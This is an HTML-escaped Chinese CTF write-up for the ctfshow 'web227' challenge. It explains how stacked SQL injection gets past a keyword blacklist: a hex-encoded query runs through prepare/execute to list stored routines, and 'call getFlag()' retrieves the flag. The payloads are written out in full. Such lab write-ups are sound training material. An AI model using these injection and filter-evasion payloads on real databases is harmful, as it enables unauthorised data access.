&lt;h1 id=&#34;web227&#34;&gt;&lt;a href=&#34;#web227&#34; class=&#34;headerlink&#34; title=&#34;web227&#34;&gt;&lt;/a&gt;web227&lt;/h1&gt;&lt;pre&gt;&lt;code class=&#34;sql&#34;&gt;堆叠注入提升 高级难度


查询语句
  //分页查询
  $sql = &amp;quot;select id,username,pass from ctfshow_user where username = &amp;#39;&amp;#123;$username&amp;#125;&amp;#39;;&amp;quot;;


返回逻辑
  //师傅说过滤的越多越好
if(preg_match(&amp;#39;/file|into|dump|union|select|update|delete|alter|drop|create|describe|set|show|db|\,/i&amp;#39;,$username))&amp;#123;
    die(json_encode($ret));
  &amp;#125;
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;&lt;strong&gt;表中没有写入flag，而是把flag写在了储存过程和函数中&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;在 MySQL 中，存储过程和函数的信息存储在 &lt;code&gt;information_schema&lt;/code&gt; 数据库下的 &lt;code&gt;Routines&lt;/code&gt; 表中&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;查询语法：&lt;code&gt;select * from information_schema.Routines where ROUTINE_NAME = &amp;#39;sp_name&amp;#39; &lt;/code&gt;;&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;其中，&lt;code&gt;ROUTINE_NAME&lt;/code&gt; 字段中存储的是存储过程和函数的名称；&lt;code&gt;sp_name&lt;/code&gt; 参数表示存储过程或函数的名称。&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;&amp;nbsp;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;&lt;code&gt;CALL&lt;/code&gt; 是用来 调用存储过程（Stored Procedure） 的关键字。&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;存储过程是事先在数据库中定义好的 SQL 逻辑，可以带参数，也可以返回结果。使用 &lt;code&gt;call&lt;/code&gt; 可以直接执行这个过程&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;&amp;nbsp;&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;bash&#34;&gt;select * from information_schema.routines
--&amp;gt;
0x73656c656374202a2066726f6d20696e666f726d6174696f6e5f736368656d612e726f7574696e6573
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;&amp;nbsp;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;先查看 &lt;code&gt;information_schema.routines&lt;/code&gt; 表下储存过程或函数的名称（在这里已经能看到flag，属于非预期）&lt;/strong&gt;&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;php&#34;&gt;?username=1&amp;#39;;prepare a from 0x73656c656374202a2066726f6d20696e666f726d6174696f6e5f736368656d612e726f7574696e6573;execute a;
&lt;/code&gt;&lt;/pre&gt;
&lt;img data-src=&#34;\images\article_images\image-20250902001146316.png&#34; alt=&#34;image-20250902001146316&#34; style=&#34;zoom:25%;&#34; /&gt;

&lt;p&gt;&amp;nbsp;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;调用存储过程&lt;/strong&gt;&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;php&#34;&gt;?username=1&amp;#39;;call getFlag();
&lt;/code&gt;&lt;/pre&gt;
&lt;img data-src=&#34;\images\article_images\image-20250902001510264.png&#34; alt=&#34;image-20250902001510264&#34; style=&#34;zoom:25%;&#34; /&gt;

&lt;p&gt;&amp;nbsp;&lt;/p&gt;
&lt;hr&gt;
